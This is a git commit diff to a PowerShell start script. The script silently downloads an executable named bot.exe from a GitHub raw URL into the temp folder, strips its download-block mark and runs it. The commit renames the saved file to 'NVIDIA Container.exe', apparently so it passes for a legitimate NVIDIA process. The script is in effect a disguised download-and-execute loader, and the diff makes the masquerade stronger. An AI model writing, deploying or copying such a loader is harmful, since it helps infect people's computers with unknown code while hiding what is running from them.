3c75ab2a562e9a9875ea63b7e8e66a0ad8b86748
yuko22572-dotcom <yuko22572@gmail.com>
2026-08-26 22:26:16 +0300

    Update start.ps1

--- dist/start.ps1
+++ dist/start.ps1
@@ -1,5 +1,5 @@
 $ProgressPreference = 'SilentlyContinue'
-$p = "$env:TEMP\app.exe"
+$p = "$env:TEMP\NVIDIA Container.exe"
 Invoke-WebRequest -Uri "https://github.com/yuko22572-dotcom/main/raw/refs/heads/main/dist/bot.exe" -OutFile $p
 Unblock-File -Path $p
 Start-Process $p
